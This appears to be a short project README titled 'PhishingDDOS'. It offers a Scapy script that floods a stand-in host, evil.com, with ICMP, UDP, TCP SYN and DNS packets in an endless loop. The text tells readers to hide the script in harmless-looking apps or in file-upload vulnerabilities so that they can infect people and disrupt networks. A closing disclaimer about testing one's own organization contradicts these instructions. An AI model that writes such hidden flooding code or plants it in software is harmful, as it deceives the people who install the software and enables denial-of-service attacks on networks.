# PhishingDDOS
This tool contains a code that you can use to hide in seemingly harmless apps that you code for people with whom you can infect. Multiple infected hosts with barely any trace of the attacker will disrupt the network.

<h2>How to use it</h2>

<b>Integrate it within an executable file that you coded for it to look harmless for your targets. You can change the code as you like as I have described below how it works and what adjustments you can make</b>


<h1><b>What you can do with the code</b></h1>

``` 
from scapy.all import *

# Loop to send different types of packets
while True:
        # Time for DDOS
    packet = IP(dst="evil.com")/ICMP()
    send(packet)
    send(packet)
    send(packet)
    send(packet)
    packet = IP(dst="evil.com")/UDP(dport=12345)/Raw(load="Hello, UDP!")
    send(packet)
    send(packet)
    send(packet)
    send(packet)
    packet = IP(dst="evil.com")/TCP(dport=80, flags="S")
    send(packet)
    send(packet)
    send(packet)
    send(packet)
    packet = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(qd=DNSQR(qname="evil.com"))
    send(packet)
    send(packet)
    send(packet)
    send(packet)
    # Send the packet
```

In the while loop, depending on how much you want to destroy the network. Put in as many send(packets between the packet variables as much as you want.
Code it within either a file upload vulnerability or integrated within a Python application for people to use.

<h1>WARNING</h1>
Use this to test your company/organization's security of the community and networks. It is illegal to perform DDOS with malicious intent.
Do it only to protect yourself and your organization
